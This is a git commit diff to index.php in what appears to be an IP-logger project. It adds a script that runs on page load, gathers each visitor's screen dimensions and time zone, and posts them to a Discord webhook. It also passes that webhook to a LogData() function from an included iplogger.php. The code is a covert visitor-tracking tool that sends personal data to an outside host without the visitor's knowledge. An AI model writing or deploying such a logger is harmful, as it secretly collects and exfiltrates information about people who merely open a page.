8fb1e6c96c3c2543707925a332873577378551f9
Gray Programmerz <54432616+graysuit@users.noreply.github.com>
2022-01-12 18:47:22 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,18 @@
+<script>
+var url = "https://discord.com/api/webhooks/090908015099031078/QbeMHERTUYIOHmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPGHJKRTYUIOBoOVJqUryG_w0o"; //example
+
+var xhr = new XMLHttpRequest();
+xhr.open('POST', url, true);
+xhr.setRequestHeader('Content-type', 'application/json');
+var data =    
+    '"Width=":' + window.screen.availWidth + "\n" +            
+    '"Height=":' + window.screen.availHeight + "\n" +
+    '"TimeZone=":' + Intl.DateTimeFormat().resolvedOptions().timeZone;
+xhr.send(JSON.stringify({content: data}));
+</script>
+
 <?php
+$url = "https://discord.com/api/webhooks/090908015099031078/QbeMHERTUYIOHmJ_SkyQ_1536C9rwOyeBsjqcWejT0MdPGHJKRTYUIOBoOVJqUryG_w0o"; //example
 include("iplogger.php");
-LogData();
+LogData($url);
 ?>
